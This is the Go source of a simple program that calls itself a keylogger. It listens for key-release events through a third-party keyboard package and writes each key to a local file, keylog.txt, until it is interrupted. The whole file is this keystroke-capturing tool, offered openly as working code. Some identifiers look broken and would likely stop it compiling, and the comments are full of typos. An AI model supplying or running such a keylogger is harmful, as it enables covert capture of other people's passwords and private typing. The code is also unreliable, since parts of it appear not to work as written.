# keyboard

package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/ritikkumar12345/keyboard"
)

func main() {
	//Initialize the keylogger listner
	kb, err := keyboard.NewKeyboard()
	if err != nil {
		fmt.Printf("Failed to initialize keyboard listner: %v\n", err)
		return
	}

	//Open a file to store logged keystrokes
	file, err := os.Create("keylog.txt")
	if err != nil {
		fmt.Printf("Failed to create keylog file: %v\n ", err)
		return
	}
	defer file.Close()

	//Start listening for keyboard events
	err = kb.Start()
	if err != nil {
		fmt.Printf("Failed to start keyboard listner: %v\n", err)
		return
	}

	//Handle Ctrc+C signal to stop the keylogger
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-signalChan
		fmt.Println("\nStopping keylogger....")
		kb.stop()

	}()

	fmt.Println("Keylogger started. Press Ctrl+C to stop.")

	// Log keystokes
	for {
		event := <-kb.Events
		if event.Err != nil {
			fmt.Printf("Failed to read keyboard event: %v\n", event.Err)
			continue
		}

		if event.Kind == keyboard.keyRelease {
			// Write the key to the log file
			file.WriteString(fmt.Sprintf("%s\n", event.key))
		}

	}
}
